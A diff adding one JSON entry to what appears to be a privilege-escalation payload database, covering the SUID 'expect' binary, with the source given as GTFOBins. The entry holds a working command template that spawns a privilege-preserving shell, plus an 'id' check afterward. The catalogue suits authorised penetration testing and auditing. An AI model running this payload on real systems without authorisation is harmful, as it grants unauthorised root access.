@@ -1,0 +1,1 @@
+{"id":"suid_expect","category":"SUID_GTFOBINS","binary":"expect","cve":null,"exploitation":["{{binary}} -c \"spawn {{shell}} -p; interact\""],"post_exploit":["id"],"source":"gtfobins.github.io","tags":["suid","gtfobins"],"severity":"high"}
